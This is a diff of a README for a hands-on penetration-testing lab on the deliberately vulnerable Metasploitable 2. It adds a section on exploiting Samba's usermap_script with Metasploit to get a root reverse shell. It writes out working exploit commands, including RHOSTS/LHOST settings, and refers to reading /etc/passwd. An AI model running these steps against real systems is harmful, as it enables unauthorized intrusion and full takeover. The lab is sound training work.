@@ -1,7 +1,7 @@
 # Network-VAPT-Metasploitable
 Hands-on vulnerability assessment and penetration testing lab on Metasploitable 2 using Kali Linux and Metasploit.
 
-# Initial Reconnaissance and Vulnerability Scanning
+# Phase 1: Initial Reconnaissance and Vulnerability Scanning
 - Nmap (Network Mapper) is an open-source tool used by security professionals to scan networks,
 - discover active devices, find open ports, and identify running services along with their security
   flaws.
@@ -40,7 +40,7 @@ sudo nmap --script=vuln 192.168.0.113
 - msf > search vsftp
 <img width="1920" height="950" alt="Screenshot_2026-10-17_12_01_18" src="https://github.com/user-attachments/assets/f10b3e83-e9a8-4f7e-bff0-4313695ce6b1" />
 
-# Observations & Output:
+## Observations & Output:
 
 ## The search query returned two matching modules:   
 
@@ -172,6 +172,54 @@ bash
 What it does: The `/etc/passwd` file contains public account information, listing all valid usernames, user IDs (UID), group IDs (GID), home directories, and their assigned default login shells[cite: 8].
 
 Observations: Identified active users and their respective home paths (e.g., `/home/msfadmin`, `/home/user`) along with system daemons that have restricted or no login access (`/bin/false` or `/sbin/nologin`)[cite: 8].
+
+------------
+
+# Phase 3: Samba Service Exploitation (usermap_script)
+
+After successfully exploiting the FTP backdoor, I moved on to target the Samba service running on the Metasploitable machine to demonstrate multi-vector exploitation.
+
+---
+
+## Step 1: Searching for Samba Exploit Modules
+I initialized Metasploit and searched for available modules related to the Samba service to find a suitable remote code execution vulnerability.
+
+bash
+- msfconsole
+- msf > search samba
+
+<img width="1920" height="950" alt="Screenshot_2026-10-17_12_23_00" src="https://github.com/user-attachments/assets/8851db14-6ddf-4895-9905-8f29ab31c3d3" />
+
+Observations:The search query returned various auxiliary and exploit modules targeting different versions of Samba (such as usermap_script, nttrans, and buffer overflows)
+
+## Step 2: Selecting the usermap_script Exploit Module
+
+From the list of matching search results, I identified and selected the exploit/multi/samba/usermap_script module (located at index 15), which allows remote command execution via malformed usernames during map script execution.
+
+bash 
+
+- msf > use 15
+
+<img width="1920" height="950" alt="Screenshot_2026-10-17_12_23_23" src="https://github.com/user-attachments/assets/8ffd3445-6dde-4af6-8ed8-cbb2a2c41f3d" />
+
+## Step 3: Configuring Options and Executing the Exploit
+
+After selecting the module, I configured the target IP (RHOSTS), our attacker machine IP (LHOST), and successfully executed the exploit to spawn a command shell[cite: 11].
+
+msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.0.113
+msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.0.139
+msf6 exploit(multi/samba/usermap_script) > exploit
+
+<img width="1920" height="950" alt="Screenshot_2026-10-17_12_22_20" src="https://github.com/user-attachments/assets/32d12d41-354a-499a-892c-19caa0a2c778" />
+
+Post-Exploitation & Privilege Verification:
+Once the command shell session opened (Command shell session 1 opened), I verified our access level on the target system:
+
+Output confirmed access as root.
+
+Checking User & Group IDs (id):
+
+Output confirmed uid=0(root) gid=0(root), proving we achieved full administrative control over the target via Samba as well.
 
 
 
